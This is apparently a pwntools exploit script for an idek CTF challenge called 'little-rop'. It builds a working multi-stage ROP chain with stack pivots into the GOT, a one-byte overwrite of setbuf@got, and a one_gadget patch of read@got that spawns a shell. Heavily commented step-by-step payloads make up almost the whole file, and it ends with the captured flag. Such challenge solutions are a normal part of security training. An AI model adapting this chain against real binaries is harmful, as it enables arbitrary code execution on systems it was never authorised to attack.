from pwn import *
# from subprocess import getoutput

context.arch = 'amd64'
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']

p = gdb.debug('./chall_patched', '''
    b *(vuln+35)
    continue
''')

# p = remote('little-rop.chal.idek.team', 1337)

# p.recvuntil(b"You can run the solver with:\n")
# cmd = p.recvline().decode().strip()
# sol = getoutput(cmd)
# p.sendlineafter(b"Solution? ", sol.encode())
# p.recvuntil(b"Correct\n")
# pause()

# special gadgets
GADGET_1 = 0x40113c  # add dword ptr [rbp-0x3d], ebx; nop; ret; (__do_global_dtors_aux)
GADGET_2 = 0x4011a2  # mov rbp, rsp; sub rsp, 0x20; lea rax, [rbp-0x20]; mov edx, 0x30; mov rsi, rax; mov edi, 0x0; call 0x401060 <read@plt>; nop; leave; ret; (vuln)
GADGET_3 = 0x4011a9  # lea rax, [rbp-0x20]; mov edx, 0x30; mov rsi, rax; mov edi, 0x0; call 0x401060 <read@plt>; nop; leave; ret; (vuln)
GADGET_4 = 0x4011c0  # leave; ret; (vuln)
GADGET_5 = 0x4011f0  # add rsp, 0x8; ret; (main)

# useful addresses
SETBUF_GOT = 0x404018  # setbuf@got
SETBUF_PLT = 0x401050  # setbuf@plt
READ_GOT = 0x404020  # read@got
FAKE_RBP = 0x404800  # fake_rbp


# one gadget offset from glibc
ONE_GADGET_OFFSET = 0xebd43
# 0xebd43 execve("/bin/sh", rbp-0x50, [rbp-0x70])
# constraints:
#   address rbp-0x50 is writable
#   rax == NULL || {rax, [rbp-0x48], NULL} is a valid argv
#   [[rbp-0x70]] == NULL || [rbp-0x70] == NULL || [rbp-0x70] is a valid envp

# each read@plt call is limited to read in 0x30 bytes at most

# 1. first read@plt call in original vuln function to:
# set rbp=*rbp=setbuf@got+0x40 through 'leave' instruction
# return to gadget 3
payload1 = b'A'*0x20+p64(SETBUF_GOT+0x48-8)+p64(GADGET_3)
p.send(payload1)
pause()

# 2. second read@plt call (rbp=setbuf@got+0x40) in gadget 3 to:
# write fake_rbp to setbuf@got+0x20
# write gadget 3 to setbuf@got+0x28
# write setbuf@got+0x20 to setbuf@got+0x40
# write gadget 3 to setbuf@got+0x48
# stack pivot to rsp=rbp+8=setbuf@got+0x48 and set rbp=*rbp=setbuf@got+0x20 through 'leave' instruction
# return to gadget 3
payload2 = p64(FAKE_RBP)+p64(GADGET_3)+b'B'*0x10+p64(SETBUF_GOT+0x20)+p64(GADGET_3)
p.send(payload2)
pause()

# 3. third read@plt call (rbp=setbuf@got+0x20) in gadget 3 to:
# write \xaa as last significant byte to function pointer in setbuf@got
# stack pivot to rsp=rbp+8=setbuf@got+0x28 and set rbp=*rbp=fake_rbp through 'leave' instruction
# return to gadget 3
payload3 = p8(0xaa)
p.send(payload3)
# function pointer in setbuf@got points to a magic gadget containing 'pop rbx' instruction now
'''
gef> x/3i 0x000072b989669faa                      
   0x72b989669faa <__GI_rewind+138>:    pop    rbx
   0x72b989669fab <__GI_rewind+139>:    pop    rbp
   0x72b989669fac <__GI_rewind+140>:    ret        
'''
# reason why this operation works is that in this version of glibc, only lsb is different between setbuf symbol at offset 0x87fe0 and this magic gadget at offset 0x87faa
# 'pop rbx' instruction in magic gadget gives controll of full rbx register, which is necessary for 'add dword ptr [rbp-0x3d], ebx' instruction in gadget 1
pause()

# 4. fourth read@plt call (rbp=fake_rbp) in gadget 3 to:
# write setbuf@plt to fake_rbp-0x20
# write difference -(glibc_read_addr-glibc_onegadget_addr) to fake_rbp-0x18
# write read@got+0x3d to fake_rbp-0x10
# write gadget 1 to fake_rbp-0x8
# write fake_rbp+0x20 to fake_rbp
# write gadget 3 to fake_rbp+0x8
# stack pivot to rsp=rbp+8=fake_rbp+0x8 and set rbp=*rbp=fake_rbp+0x20 through 'leave' instruction
# return to gadget 3
glibc_e = ELF('./libc.so.6')
payload4 = p64(SETBUF_PLT)+p64(0x100000000-(glibc_e.sym.read-ONE_GADGET_OFFSET))+p64(READ_GOT+0x3d)+p64(GADGET_1)+p64(FAKE_RBP+0x20)+p64(GADGET_3)
p.send(payload4)
pause()

# 5. fifth read@plt call (rbp=fake_rbp+0x20) in gadget 3 to:
# write gadget 5 to fake_rbp
# write gadget 4 to fake_rbp+0x8
# write gadget 2 to fake_rbp+0x10
# write fake_rbp-0x28 to fake_rbp+0x20
# write gadget 4 to fake_rbp+0x28
# stack pivot to rsp=rbp+8=fake_rbp+0x28 and set rbp=*rbp=fake_rbp-0x28 through 'leave' instruction
# return to gadget 4
payload5 = p64(GADGET_5)+p64(GADGET_4)+p64(GADGET_2)+b'E'*8+p64(FAKE_RBP-0x20-8)+p64(GADGET_4)
p.send(payload5)
# fake_rbp+0x8 happens to save return address of read@plt call, which is where read@plt returns to (nop; leave; ret;), and read@plt must be ensured to return correctly
# so value in fake_rbp+0x8 has to be written the same as instruction address right after read@plt call ('nop' instruction can be ignored), which is gadget 4 (leave; ret;)
# but value in fake_rbp+0x8 will be an obstacle to subsequent ROP progress later, which means that it has to be passed through to guarantee ROP chain to work correctly
# so value in fake_rbp has to be written with gadget 5 (add rsp, 0x8; ret;) to move rsp forward by 0x8 bytes to pass through value in fake_rbp+0x8 to continue ROP chain
pause()

# 6. what happened next:
# stack pivot to rsp=rbp+8=fake_rbp-0x20 and set rbp=*rbp=0 through 'leave' instruction in gadget 4
# call setbuf@plt (function pointer in setbuf@got points to magic gadget now) in fake_rbp-0x20 to set rbx=-(glibc_read_addr-glibc_onegadget_addr) and rbp=read@got+0x3d
# call gadget 1 in fake_rbp-0x8 to set function pointer in read@got to one gadget by adding difference -(glibc_read_addr-glibc_onegadget_addr) to it
# call gadget 5 in fake_rbp to move rsp forward by 0x8 bytes
# call gadget 2 in fake_rbp+0x10 to normalize rbp and call read@plt (function pointer in read@got points to one gadget now) to trigger one gadget

p.interactive()

# idek{R0p_r0P_R0P_5HOW_u$_7HE_R0P}